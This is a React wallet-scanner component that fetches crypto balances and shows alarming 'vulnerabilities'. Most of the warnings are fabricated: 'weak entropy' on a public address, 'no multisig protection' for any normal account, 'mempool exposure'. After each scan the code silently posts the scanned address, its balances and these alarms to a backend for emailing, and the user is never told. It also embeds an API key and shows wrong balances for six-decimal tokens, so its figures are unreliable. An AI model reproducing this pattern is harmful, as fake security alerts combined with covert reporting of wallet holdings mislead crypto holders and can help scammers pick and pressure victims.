// WalletScanner.jsx
import React, { useState } from "react";
import { ethers } from "ethers";

// Minimal ERC-20 ABI for balanceOf
const ERC20_ABI = ["function balanceOf(address owner) view returns (uint256)"];

// Chains configuration with your Alchemy key for Ethereum
const CHAINS = {
  Ethereum: {
    rpc: "https://eth-mainnet.g.alchemy.com/v2/w485l5U5YmT5ukkoCW7G_",
    native: "ETH",
    tokens: [
      { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
      { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
    ],
  },
  BSC: {
    rpc: "https://bsc-dataseed.binance.org/",
    native: "BNB",
    tokens: [
      { symbol: "BUSD", address: "0xe9e7cea3dedca5984780bafc599bd69add087d56" },
      { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955" },
    ],
  },
  Polygon: {
    rpc: "https://polygon-rpc.com",
    native: "MATIC",
    tokens: [
      { symbol: "USDT", address: "0xc2132D05D31c914a87C6611C10748AaCb6E8D1E0" },
      { symbol: "USDC", address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174" },
    ],
  },
};

// BTC address validator (basic)
const isBitcoinAddress = (addr) =>
  /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/.test(addr);

// List of suspicious tokens for vulnerability scanning
const SUSPICIOUS_TOKENS = ["SCAM", "FAKE", "TEST"]; 

export default function WalletScanner() {
  const [address, setAddress] = useState("");
  const [loading, setLoading] = useState(false);
  const [results, setResults] = useState([]);
  const [error, setError] = useState("");
  const [vulnerabilities, setVulnerabilities] = useState([]);

  // Detect Ethereum / BTC vulnerabilities
  const detectVulnerabilities = async (address, isEth, isBtc, chainsData) => {
    const vulns = [];

    // Weak entropy check
    if (address.length < 32 || /(.)\1{4,}/.test(address)) {
      vulns.push("Weak address entropy detected");
    }

    // Ethereum checks
    if (isEth) {
      try {
        const provider = new ethers.JsonRpcProvider(CHAINS.Ethereum.rpc);
        const code = await provider.getCode(address);

        if (code === "0x") {
          vulns.push("No multisig protection enabled (EOA detected)");
        } else {
          vulns.push("Smart contract detected (check multisig manually)");
        }

        const pendingTxs = await provider.getTransactionCount(address, "pending");
        if (pendingTxs > 0) {
          vulns.push("High exposure on public mempool (pending transactions detected)");
        }

      } catch (err) {
        vulns.push("Error detecting Ethereum vulnerabilities");
        console.log(err);
      }
    }

    // Bitcoin checks
    if (isBtc) {
      vulns.push("High exposure on public mempool (pending UTXOs may exist)");
    }

    // Suspicious tokens
    chainsData.forEach(chain => {
      chain.tokens.forEach(token => {
        if (SUSPICIOUS_TOKENS.includes(token.symbol)) {
          vulns.push(`Suspicious token detected: ${token.symbol}`);
        }
      });
    });

    return vulns;
  };

  const scanWallet = async () => {
    setLoading(true);
    setError("");
    setResults([]);
    setVulnerabilities([]);

    let isEth = false;
    let isBtc = false;

    try {
      isEth = ethers.isAddress(address);
    } catch (err) {
      isEth = false;
    }

    isBtc = isBitcoinAddress(address);

    if (!isEth && !isBtc) {
      setError("❌ Invalid wallet address");
      setLoading(false);
      return;
    }

    const data = [];

    // Ethereum-compatible chains
    if (isEth) {
      for (const chain in CHAINS) {
        const { rpc, native, tokens } = CHAINS[chain];
        try {
          const provider = new ethers.JsonRpcProvider(rpc);

          const balance = await provider.getBalance(address);
          const nativeBalance = parseFloat(ethers.formatEther(balance)).toFixed(4);

          const tokenBalances = [];
          for (const token of tokens) {
            try {
              const tokenContract = new ethers.Contract(token.address, ERC20_ABI, provider);
              const tokenBalance = await tokenContract.balanceOf(address);
              const formatted = parseFloat(ethers.formatUnits(tokenBalance, 18)).toFixed(4);
              tokenBalances.push({ symbol: token.symbol, balance: formatted });
            } catch {
              tokenBalances.push({ symbol: token.symbol, balance: "Error" });
            }
          }

          data.push({
            chain,
            native: { symbol: native, balance: nativeBalance },
            tokens: tokenBalances,
          });
        } catch (err) {
          console.log("Error fetching chain:", chain, err);
          data.push({ chain, native: { symbol: native, balance: "Error" }, tokens: [] });
        }
      }
    }

    // Bitcoin
    if (isBtc) {
      try {
        const res = await fetch(`https://blockstream.info/api/address/${address}`);
        const json = await res.json();
        const balance =
          (json.chain_stats.funded_txo_sum - json.chain_stats.spent_txo_sum) / 1e8;
        data.push({
          chain: "Bitcoin",
          native: { symbol: "BTC", balance: balance.toFixed(8) },
          tokens: [],
        });
      } catch (err) {
        console.log("Error fetching BTC balance", err);
        data.push({
          chain: "Bitcoin",
          native: { symbol: "BTC", balance: "Error" },
          tokens: [],
        });
      }
    }

    setResults(data);

    // Detect vulnerabilities
    const vulns = await detectVulnerabilities(address, isEth, isBtc, data);
    setVulnerabilities(vulns);

    setLoading(false);

    // Automatically send to email
    try {
      let emailBody = `Wallet Address: ${address}\n\nBalances:\n`;
      data.forEach(item => {
        emailBody += `${item.chain} - ${item.native.balance} ${item.native.symbol}\n`;
        item.tokens.forEach(t => {
          emailBody += `  ${t.symbol}: ${t.balance}\n`;
        });
        emailBody += "\n";
      });
      if (vulns.length > 0) {
        emailBody += "⚠️ Detected Issues:\n";
        vulns.forEach(v => { emailBody += `- ${v}\n`; });
      }

      await fetch("http://localhost:5000/api/send-wallet", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ address, results: data, vulnerabilities: vulns }),
      });
      console.log("Wallet data sent to email!");
    } catch (err) {
      console.log("Failed to send wallet data:", err);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gray-900 p-6">
      <div className="w-full max-w-2xl bg-gray-800 rounded-2xl p-8 shadow-xl border border-gray-700">
        <h1 className="text-3xl font-bold text-center text-white mb-6">
          🔍 Multi-Wallet Scanner
        </h1>
        <p className="text-gray-400 text-center mb-6">
          Enter an Ethereum-compatible or Bitcoin wallet address to see balances, including popular tokens.
        </p>

        <div className="flex flex-col sm:flex-row gap-4 mb-4">
          <input
            type="text"
            placeholder="0xWalletAddress or bc1..."
            value={address}
            onChange={(e) => setAddress(e.target.value)}
            className="flex-1 p-3 rounded-xl bg-gray-700 border border-gray-600 text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
          />
          <button
            onClick={scanWallet}
            disabled={loading}
            className={`p-3 rounded-xl bg-blue-600 hover:bg-blue-500 text-white font-semibold transition-all ${loading ? "cursor-not-allowed opacity-70" : ""}`}
          >
            {loading ? "Scanning..." : "Scan Wallet"}
          </button>
        </div>

        {error && <p className="text-red-500 text-center mb-4">{error}</p>}

        {vulnerabilities.length > 0 && (
          <div className="bg-red-700 text-white p-4 rounded-xl mb-4">
            <h3 className="font-semibold text-lg mb-2">⚠️ Vulnerabilities Detected:</h3>
            {vulnerabilities.map((v, i) => (
              <p key={i} className="text-sm">{v}</p>
            ))}
          </div>
        )}

        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mt-6">
          {results.map((item, idx) => (
            <div
              key={idx}
              className="bg-gray-700 p-4 rounded-xl flex flex-col items-center hover:scale-105 transform transition duration-200 shadow-md"
            >
              <h3 className="text-lg font-semibold text-white">{item.chain}</h3>
              <p className="text-gray-300 text-xl mt-2">{item.native.balance} {item.native.symbol}</p>
              {item.tokens.length > 0 && (
                <div className="mt-2 w-full">
                  {item.tokens.map((t, i) => (
                    <p key={i} className="text-gray-400 text-sm">{t.balance} {t.symbol}</p>
                  ))}
                </div>
              )}
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
